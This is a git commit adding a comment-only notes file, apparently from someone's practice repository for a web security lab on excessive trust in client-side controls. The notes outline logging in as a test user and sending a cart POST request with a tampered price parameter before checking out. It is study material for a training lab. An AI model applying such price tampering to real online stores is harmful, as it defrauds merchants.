b858740e2d8350e1c71fdb324c13e2d60e1e9429
Pranjal <pranjalruhela2811@gmail.com>
2023-07-09 15:33:28 +0530

    price change

---
+++ BrokenAccessControl/App Logic Vulns/Excessive trust in client-side controls/stsps.js
@@ -0,0 +1,10 @@
+/*
+1) Login as wiener ......available credit is $100
+
+2) POST /cart HTTP/2
+   productId=1&redir=PRODUCT&quantity=1&price=133700
+   productId=1&redir=PRODUCT&quantity=1&price=13      //mauddi5
+
+3) GET /cart HTTP/2
+4) POST /cart/checkout HTTP/2
+*/
